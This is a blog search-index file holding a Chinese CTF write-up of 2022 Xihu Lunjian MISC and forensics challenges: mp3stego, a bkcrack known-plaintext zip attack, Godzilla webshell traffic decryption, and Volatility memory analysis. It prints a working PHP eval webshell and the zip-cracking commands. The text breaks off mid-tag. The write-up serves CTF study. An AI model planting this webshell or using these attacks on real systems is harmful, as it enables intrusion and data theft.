<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2022西湖论剑MISC复现</title>
    <link href="/2023/11/30/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/11/30/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="2022西湖论剑MISC复现"><a href="#2022西湖论剑MISC复现" class="headerlink" title="2022西湖论剑MISC复现"></a>2022西湖论剑MISC复现</h1><p>强网杯快开始了，想着复现一下取证和misc的题目，刚好2022西湖论剑都有，而且难度也挺高</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="mp3"><a href="#mp3" class="headerlink" title="mp3"></a><strong>mp3</strong></h2><p>拿到cipher.mp3，听一下，熟悉的可以一下分辨出这是<code>mp3stego</code>的默认加解密音频，因为没有密码，先看看010</p><p><img src="/../img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/170134897029315.png" alt="img"></p><p>看到有个png，foremost分离一下</p><p><img src="/../img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/17013489702651.png" alt="img"></p><p>拿到只有黑白像素的png图片</p><p><img src="/../img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/17013489702662.png" alt="img"></p><p>按行转成010的二进制值然后再转成16进制数保存为文件看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs Bash">from PIL import Image<br>import struct<br><br>img = Image.open(<span class="hljs-string">&#x27;00000646.png&#x27;</span>)<br>width, height = img.size<br><br>f = open(<span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment">#按行读取</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> range(height):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(width):<br>        flag += str(img.getpixel((x, y))//255)  <span class="hljs-comment">#255//255 = 1 ; 0//255 = 0</span><br><span class="hljs-comment">#print(flag)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(0, len(flag), 8):<br>    f.write(struct.pack(<span class="hljs-string">&#x27;B&#x27;</span>, int(flag[i:i+8], 2)))<br>f.close()<br></code></pre></td></tr></table></figure><p><code>50 4B 03 04</code>拿到zip，里面有个加密的47.txt</p><p><img src="/../img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/17013489702663.png" alt="img"></p><p>尝试了一下不是伪加密，回到mp3stego，无密码直接解密得到压缩包密码<code>8750d5109208213f</code></p><p><img src="/../img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/17013489702664.png" alt="img"></p><p>拿到47.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">2lO,.j2lL000iZZ2[2222iWP,.ZQQX,2.[002iZZ2[2020iWP,.ZQQX,2.[020iZZ2[2022iWLNZQQX,2.[2202iW2,2.ZQQX,2.[022iZZ2[2220iWPQQZQQX,2.[200iZZ2[202iZZ2[2200iWLNZQQX,2.[220iZZ2[222iZZ2[2000iZZ2[2002iZZ2Nj2]20lW2]20l2ZQQX,2]202.ZW2]02l2]20,2]002.XZW2]22lW2]2ZQQX,2]002.XZWWP2XZQQX,2]022.ZW2]00l2]20,2]220.XZW2]2lWPQQZQQX,2]002.XZW2]0lWPQQZQQX,2]020.XZ2]20,2]202.Z2]00Z2]02Z2]2j2]22l2]2ZWPQQZQQX,2]022.Z2]00Z2]0Z2]2Z2]22j2]2lW2]000X,2]20.,2]20.j2]2W2]2W2]22ZQ-QQZ2]2020ZWP,.ZQQX,2]020.Z2]2220ZQ--QZ2]002Z2]220Z2]020Z2]00ZQW---Q--QZ2]002Z2]000Z2]200ZQ--QZ2]002Z2]000Z2]002ZQ--QZ2]002Z2]020Z2]022ZQ--QZ2]002Z2]000Z2]022ZQ--QZ2]002Z2]020Z2]200ZQ--QZ2]002Z2]000Z2]220ZQLQZ2]2222Z2]2000Z2]000Z2]2002Z2]222Z2]020Z2]202Z2]222Z2]2202Z2]220Z2]2002Z2]2002Z2]2202Z2]222Z2]2222Z2]2202Z2]2022Z2]2020Z2]222Z2]2220Z2]2002Z2]222Z2]2020Z2]002Z2]202Z2]2200Z2]200Z2]2222Z2]2002Z2]200Z2]2022Z2]200ZQN---Q--QZ2]200Z2]000ZQXjQZQ-QQXWXXWXj<br></code></pre></td></tr></table></figure><p>由47联想到rot47</p><p><img src="/../img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/17013489702665.png" alt="img"></p><p>类似jjencode，console直接解得到flag：DASCTF{f8097257d699d7fdba7e97a15c4f94b4}</p><p><img src="/../img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/17013489702666.png" alt="img"></p><h2 id="take-the-zip-easy"><a href="#take-the-zip-easy" class="headerlink" title="take_the_zip_easy"></a>take_the_zip_easy</h2><p>拿到zipeasy.zip，里面是两个加密的文件，看到两个文件名字一样，猜想zip是pcapng压缩得到的，而且加密算法为ZipCrypto，有两段偏移可能相同，30-43：<code>64 61 73 66 6C 6F 77 2E 70 63 61 70 6E 67</code>，0-3：<code>50 4B 03 04 </code></p><p>尝试明文攻击</p><p><img src="/../img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/170134897026613.png" alt="img"></p><p><code>bkcrack.exe -C zipeasy.zip -x 30 646173666C6F772E706361706E67 -x 0 504B0304 -c dasflow.zip</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bkcrack</span> <span class="hljs-number">1</span>.<span class="hljs-number">5</span>.<span class="hljs-number">0</span> - <span class="hljs-number">2022</span>-<span class="hljs-number">07</span>-<span class="hljs-number">07</span><span class="hljs-meta"></span><br><span class="hljs-meta">[19:36:43] Z reduction using 6 bytes of known plaintext</span><br><span class="hljs-meta">100.0 % (6 / 6)</span><br><span class="hljs-meta">[19:36:43] Attack on 1038290 Z values at index 37</span><br><span class="hljs-meta">Keys: 2b7d78f3 0ebcabad a069728c</span><br><span class="hljs-meta">67.7 % (703384 / 1038290)</span><br><span class="hljs-meta">[19:41:03] Keys</span><br><span class="hljs-meta">2b7d78f3 0ebcabad a069728c</span><br></code></pre></td></tr></table></figure><p><code>bkcrack.exe -C zipeasy.zip -c dasflow.zip -k 2b7d78f3 0ebcabad a069728c -d dasflow.zip</code></p><p>得到dasflow.zip，解压得到dasflow.pcapng</p><p>简单看看，比较明显是哥斯拉流量，里面还有个flag.zip，<code>stream 6</code>里有原始的webshell，可以看到key为<code>d8ea7326e6ec5916</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">session_start</span>();<br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;air123&#x27;</span>;<br><span class="hljs-variable">$payloadName</span>=<span class="hljs-string">&#x27;payload&#x27;</span>;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;d8ea7326e6ec5916&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$pass</span>]))&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$pass</span>]),<span class="hljs-variable">$key</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]))&#123;<br>        <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>],<span class="hljs-variable">$key</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)===<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$payload</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">0</span>,<span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">encode</span>(@<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$data</span>),<span class="hljs-variable">$key</span>));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">16</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$data</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>stream 36</code>哥斯拉流量解密得到加密flag.zip的原始命令，得到密码<code>airDAS1231qaSW@</code></p><p><img src="/../img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/170134897026714.png" alt="img"></p><p>写脚本解密也行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;d8ea7326e6ec5916&#x27;</span>;<br><br><span class="hljs-variable">$endata</span> = <span class="hljs-string">&#x27;J%2B5pNzMyNmU2mij7dMD%2FqHMAa1dTUh6rZrUuY2l7eDVot058H%2BAZShmyrB3w%2FOdLFa2oeH%2FjYdeYr09l6fxhLPMsLeAwg8MkGmC%2BNbz1%2BkYvogF0EFH1p%2FKFEzIcNBVfDaa946G%2BynGJob9hH1%2BWlZFwyP79y4%2FcvxxKNVw8xP1OZWE3&#x27;</span>;<br><span class="hljs-variable">$dedata</span> = <span class="hljs-title function_ invoke__">gzdecode</span>(<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$endata</span>))), <span class="hljs-variable">$key</span>));  <span class="hljs-comment">//urldecode会将+号解析成空格，导致无法解密，replace回去</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dedata</span>;<br><br><span class="hljs-comment">//cmdLinePsh -c &quot;cd &quot;/var/www/html/upload/&quot;;zip -o flag.zip /flag -P airDAS1231qaSW@&quot; 2&gt;&amp;1methodNameexecCommand</span><br></code></pre></td></tr></table></figure><p>导出flag.zip，解压得到flag</p><h1 id="Fornesics"><a href="#Fornesics" class="headerlink" title="Fornesics"></a>Fornesics</h1><h2 id="Isolated-Machine-Memory-Analysis"><a href="#Isolated-Machine-Memory-Analysis" class="headerlink" title="Isolated Machine Memory Analysis"></a>Isolated Machine Memory Analysis</h2><p>参考 <a href="https://zysgmzb.club/index.php/archives/132">zysgmzb</a> <a href="https://crazymanarmy.github.io/2023/02/03/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Misc-Isolated-Machine-Memory-Analysis-Writeup/">空白</a></p><p>题目描述</p><blockquote><p>张三，现用名叫Charlie，在一家外企工作，负责flag加密技术的研究。为了避免flag泄露，这家企业制定了严格的安全策略，严禁flag离开研发服务器，登录服务器必须经过跳板机。张三使用的跳板机是一台虚拟机，虽然被全盘加密没法提取，但好消息是至少还没关机。 免责声明：本题涉及的人名、单位名、产品名、域名及IP地址等均为虚构，如有雷同纯属巧合。 注：本题模拟真实研发环境，解题有关的信息不会出现在人名、域名或IP地址等不合常理的地方。链接：<a href="https://pan.baidu.com/s/1WESej-pyjWKZni7drZGTig?pwd=cq46">https://pan.baidu.com/s/1WESej-pyjWKZni7drZGTig?pwd=cq46</a> 提取码：cq46</p></blockquote><p>hint</p><blockquote><p>Hint: hint1:在张三的电脑上发现一张截图，看起来应该是配置跳板机时无意留下的。</p><p><img src="/../img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/17013489702667.png" alt="img"></p><p>hint2:为什么这个Windows内存镜像是ELF格式？ hint3:<a href="https://github.com/volatilityfoundation/volatility/wiki/Virtual-Box-Core-Dump#meta-data">https://github.com/volatilityfoundation/volatility/wiki/Virtual-Box-Core-Dump#meta-data</a></p></blockquote><p>取证，但是拿到一个elf</p><p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf imageinfo</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Volatility Foundation Volatility Framework 2.6<br><span class="hljs-built_in">INFO</span>    : volatility.<span class="hljs-built_in">debug</span>    : Determining<span class="hljs-built_in"> profile </span>based on KDBG search<span class="hljs-built_in">..</span>.<br>          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418<br></code></pre></td></tr></table></figure><p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf --profile=Win7SP1x64 pslist</code></p><p>其他的省略，重点看这几个，VBoxTray类似vmtool，VBoxService可以确定有VirtualBox，mstsc说明有远程桌面，ClipboardMonit使用了剪贴板</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs Plain">Volatility Foundation Volatility Framework 2.6<br>Offset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit<br><br>------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------<br>...<br>0xfffffa8004d307a0 VBoxService.ex          648    460     13      116      0      0 2022-11-02 07:10:56 UTC+0000<br>...<br>0xfffffa800384d9b0 VBoxTray.exe           1884    300     12      138      1      0 2022-11-01 16:12:09 UTC+0000<br>...<br>0xfffffa8003854b00 ClipboardMonit         1516    300      1       47      1      0 2022-11-01 16:12:09 UTC+0000<br>...<br>0xfffffa80050f2b00 mstsc.exe              2840    300     14      715      1      0 2022-11-01 16:12:35 UTC+0000<br>...<br></code></pre></td></tr></table></figure><p>先看剪贴板内容</p><p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf --profile=Win7SP1x64 clipboard</code></p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">Volatility Foundation Volatility Framework 2</span><span class="hljs-string">.</span><span class="hljs-comment">6</span><br><span class="hljs-comment">Session    WindowStation Format                         Handle Object             Data</span><br><span class="hljs-literal">----------</span> <span class="hljs-literal">-------------</span> <span class="hljs-literal">------------------</span> <span class="hljs-literal">------------------</span> <span class="hljs-literal">------------------</span> <span class="hljs-literal">--------------------------------------------------</span><br>         <span class="hljs-comment">1 WinSta0       0xc009L                       0x901c1 0xfffff900c00e26b0</span><br>         <span class="hljs-comment">1 WinSta0       CF_TEXT                  0x7400000001</span> <span class="hljs-literal">------------------</span><br>         <span class="hljs-comment">1 WinSta0       CF_UNICODETEXT                0x7021f 0xfffff900c1df7970</span> <span class="hljs-literal">-----</span><span class="hljs-comment">BEGIN PUBLIC KEY</span><span class="hljs-literal">---</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">----</span><span class="hljs-comment">END PUBLIC KEY</span><span class="hljs-literal">-----</span><br>         <span class="hljs-comment">1 WinSta0       CF_TEXT                           0x0</span> <span class="hljs-literal">------------------</span><br>         <span class="hljs-comment">1 WinSta0       CF_LOCALE                         0x0</span> <span class="hljs-literal">------------------</span><br>         <span class="hljs-comment">1 WinSta0       0x0L                              0x0</span> <span class="hljs-literal">------------------</span><br>         <span class="hljs-comment">1</span> <span class="hljs-literal">-------------</span> <span class="hljs-literal">------------------</span>            <span class="hljs-comment">0x901a3 0xfffff900c01f2cc0</span><br></code></pre></td></tr></table></figure><p>看到有rsa公钥开头的data，-v查看详细信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs Plain">Volatility Foundation Volatility Framework 2.6<br>Session    WindowStation Format                         Handle Object             Data<br>---------- ------------- ------------------ ------------------ ------------------ --------------------------------------------------<br>         1 WinSta0       0xc009L                       0x901c1 0xfffff900c00e26b0<br>0xfffff900c00e26c4  5e 01 03 00 00 00 00 00                           ^.......<br>         1 WinSta0       CF_TEXT                  0x7400000001 ------------------<br>         1 WinSta0       CF_UNICODETEXT                0x7021f 0xfffff900c1df7970 -----BEGIN PUBLIC KEY---...----END PUBLIC KEY-----<br>0xfffff900c1df7984  2d 00 2d 00 2d 00 2d 00 2d 00 42 00 45 00 47 00   -.-.-.-.-.B.E.G.<br>0xfffff900c1df7994  49 00 4e 00 20 00 50 00 55 00 42 00 4c 00 49 00   I.N...P.U.B.L.I.<br>0xfffff900c1df79a4  43 00 20 00 4b 00 45 00 59 00 2d 00 2d 00 2d 00   C...K.E.Y.-.-.-.<br>0xfffff900c1df79b4  2d 00 2d 00 0d 00 0a 00 4d 00 46 00 6f 00 77 00   -.-.....M.F.o.w.<br>0xfffff900c1df79c4  44 00 51 00 59 00 4a 00 4b 00 6f 00 5a 00 49 00   D.Q.Y.J.K.o.Z.I.<br>0xfffff900c1df79d4  68 00 76 00 63 00 4e 00 41 00 51 00 45 00 42 00   h.v.c.N.A.Q.E.B.<br>0xfffff900c1df79e4  42 00 51 00 41 00 44 00 53 00 51 00 41 00 77 00   B.Q.A.D.S.Q.A.w.<br>0xfffff900c1df79f4  52 00 67 00 4a 00 42 00 41 00 49 00 45 00 5a 00   R.g.J.B.A.I.E.Z.<br>0xfffff900c1df7a04  54 00 78 00 78 00 6c 00 65 00 37 00 2b 00 35 00   T.x.x.l.e.7.+.5.<br>0xfffff900c1df7a14  72 00 79 00 77 00 43 00 35 00 62 00 79 00 49 00   r.y.w.C.5.b.y.I.<br>0xfffff900c1df7a24  75 00 42 00 6b 00 50 00 68 00 77 00 6b 00 79 00   u.B.k.P.h.w.k.y.<br>0xfffff900c1df7a34  76 00 35 00 37 00 52 00 0d 00 0a 00 37 00 35 00   v.5.7.R.....7.5.<br>0xfffff900c1df7a44  36 00 44 00 55 00 43 00 44 00 39 00 69 00 32 00   6.D.U.C.D.9.i.2.<br>0xfffff900c1df7a54  4d 00 57 00 59 00 79 00 55 00 73 00 30 00 41 00   M.W.Y.y.U.s.0.A.<br>0xfffff900c1df7a64  63 00 63 00 36 00 4a 00 5a 00 77 00 79 00 71 00   c.c.6.J.Z.w.y.q.<br>0xfffff900c1df7a74  56 00 4f 00 6d 00 52 00 37 00 34 00 75 00 4d 00   V.O.m.R.7.4.u.M.<br>0xfffff900c1df7a84  76 00 72 00 65 00 49 00 32 00 73 00 6c 00 6c 00   v.r.e.I.2.s.l.l.<br>0xfffff900c1df7a94  65 00 34 00 47 00 79 00 37 00 48 00 6c 00 36 00   e.4.G.y.7.H.l.6.<br>0xfffff900c1df7aa4  50 00 63 00 58 00 78 00 45 00 43 00 41 00 51 00   P.c.X.x.E.C.A.Q.<br>0xfffff900c1df7ab4  49 00 3d 00 0d 00 0a 00 2d 00 2d 00 2d 00 2d 00   I.=.....-.-.-.-.<br>0xfffff900c1df7ac4  2d 00 45 00 4e 00 44 00 20 00 50 00 55 00 42 00   -.E.N.D...P.U.B.<br>0xfffff900c1df7ad4  4c 00 49 00 43 00 20 00 4b 00 45 00 59 00 2d 00   L.I.C...K.E.Y.-.<br>0xfffff900c1df7ae4  2d 00 2d 00 2d 00 2d 00 00 00                     -.-.-.-...<br></code></pre></td></tr></table></figure><p>处理一下得到公钥，暂时没有什么用，再看其他</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Plain">-----BEGIN PUBLIC KEY-----<br>MFowDQYJKoZIhvcNAQEBBQADSQAwRgJBAIEZTxxle7+5rywC5byIuBkPhwkyv57R<br>756DUCD9i2MWYyUs0Acc6JZwyqVOmR74uMvreI2slle4Gy7Hl6PcXxECAQI=<br>-----END PUBLIC KEY-----<br></code></pre></td></tr></table></figure><p>看看截图</p><p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf --profile=Win7SP1x64 screenshot -D ./</code></p><p>看到上面有一串mac地址</p><p><img src="/../img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/17013489702668.png" alt="img"></p><p>netscan看看网络连接</p><p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf --profile=Win7SP1x64 netscan</code></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">Volatility Foundation Volatility Framework <span class="hljs-number">2.6</span><br>...<br><span class="hljs-number">0</span>x11e73f010        TCPv6    fc00:<span class="hljs-number">19</span>e9:ee8<span class="hljs-variable">a:7784</span>:<span class="hljs-number">645</span><span class="hljs-variable">a:2b7a</span>:f7a<span class="hljs-variable">b:64</span>:<span class="hljs-number">49158</span> fc00:<span class="hljs-number">19</span>e9:ee8<span class="hljs-variable">a:7784</span>:<span class="hljs-number">645</span><span class="hljs-variable">a:2b7a</span>:f7a<span class="hljs-variable">b:4</span>:<span class="hljs-number">3389</span> ESTABLISHED      -<span class="hljs-number">1</span><br>...<br></code></pre></td></tr></table></figure><p>根据题目描述可以大概猜到这是跳板机和服务器的网络连接</p><p>看远程桌面，先尝试找bmc文件，原理：<a href="https://www.hetianlab.com/specialized/20210713143551">https://www.hetianlab.com/specialized/20210713143551</a></p><p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf --profile=Win7SP1x64 filescan | findstr &quot;.bmc&quot;</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Volatility</span> Foundation Volatility Framework <span class="hljs-number">2</span>.<span class="hljs-number">6</span><br><span class="hljs-attribute">0x00000000085889e0</span>     <span class="hljs-number">17</span>      <span class="hljs-number">1</span> RW-r-- \Device\HarddiskVolume2\Users\Charlie Brown\AppData\Local\Microsoft\Terminal Server Client\Cache\bcache24.bmc<br><span class="hljs-attribute">0x000000011fed52a0</span>     <span class="hljs-number">14</span>      <span class="hljs-number">0</span> R--rw- \Device\HarddiskVolume2\Users\Charlie Brown\AppData\Local\Microsoft\Terminal Server Client\Cache\bcache24.bmc<br></code></pre></td></tr></table></figure><p>但是导出后分离不出图片</p><p>那么就memdump将mstsc的内存保存到本地</p><p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf --profile=Win7SP1x64 memdump -p 2840 -D ./</code></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Volatility Foundation Volatility Framework 2.6<br><span class="hljs-strong">****</span><span 